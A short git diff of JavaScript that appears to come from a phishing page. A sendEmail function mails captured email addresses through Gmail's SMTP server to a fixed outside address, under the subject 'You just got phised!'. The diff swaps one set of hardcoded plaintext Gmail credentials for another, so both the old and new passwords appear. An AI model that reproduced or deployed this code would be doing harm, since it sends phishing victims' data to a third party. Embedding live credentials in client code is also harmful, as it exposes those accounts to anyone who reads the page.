@@ -47,8 +47,8 @@ var firebaseConfig = {
   function sendEmail(email){
     Email.send({
         Host: "smtp.gmail.com",
-        Username: 'fsiteam2022@gmail.com',
-        Password: "vcqsabtjraihrbod",
+        Username: 'fsiteam2023@gmail.com',
+        Password: "123fsiteam123",
         To: "rpmm10@gmail.com",
         From: "fsiteam2022@gmail.com",
         Subject: 'You just got phised!',
